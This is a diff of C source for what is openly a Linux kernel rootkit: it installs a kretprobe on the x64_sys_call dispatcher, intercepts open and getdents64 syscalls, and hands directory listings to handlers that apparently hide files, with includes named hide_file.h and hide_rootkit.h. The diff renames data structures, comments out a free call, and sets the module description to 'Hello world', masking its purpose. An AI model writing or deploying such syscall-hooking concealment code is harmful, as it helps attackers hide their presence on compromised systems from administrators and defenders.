@@ -1,20 +1,16 @@
-#include "get_kln.h"
-#include "hide.c"
-#include "hide_file.c"
-#include "syscall_metadata.h"
+#include "hide_file.h"
+#include "hide_rootkit.h"
+#include "rootkit_cmd.h"
+
 #include <linux/file.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
-MODULE_DESCRIPTION("A simple Hello World Kernel Module");
 
 struct kretprobe kp;
 
 static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
   struct pt_regs *syscall_regs = (struct pt_regs *)regs->di;
-  struct syscall_metadata *data = (struct syscall_metadata *)k->data;
+  struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
   data->syscall = UNKNOWN;
 
   int syscall_number = *(int *)&syscall_regs->orig_ax;
@@ -31,9 +27,8 @@ static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
     data->syscall = OPEN;
   } else if (syscall_number == 0xd9) {
     data->syscall = GET_DENTS;
-    data->metadata.get_dents_metadata.buf_size =
-        *(unsigned int *)&syscall_regs->dx;
-    data->metadata.get_dents_metadata.entries =
+    data->data.getdents_data.buf_size = *(unsigned int *)&syscall_regs->dx;
+    data->data.getdents_data.entries =
         (struct linux_dirent64 *)syscall_regs->si;
   }
 
@@ -41,7 +36,7 @@ static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
 }
 
 static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
-  struct syscall_metadata *data = (struct syscall_metadata *)k->data;
+  struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
 
   if (data->syscall == OPEN) {
     open_exit_handler(regs, *data);
@@ -50,14 +45,14 @@ static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
     getdents64_exit_handler(regs, *data);
   }
 
-  free_syscall_metadata(*data);
+  // free_rootkit_cmd(*data);
   return 0;
 }
 
 static int __init rootkit_enter(void) {
 
   kp.kp.symbol_name = "x64_sys_call";
-  kp.data_size = sizeof(struct syscall_metadata);
+  kp.data_size = sizeof(struct rootkit_cmd);
   kp.maxactive = 1000;
 
   kp.entry_handler = &syscall_entry;
@@ -78,3 +73,7 @@ static void __exit rootkit_exit(void) {
 
 module_init(rootkit_enter);
 module_exit(rootkit_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Itamar");
+MODULE_DESCRIPTION("Hello world");
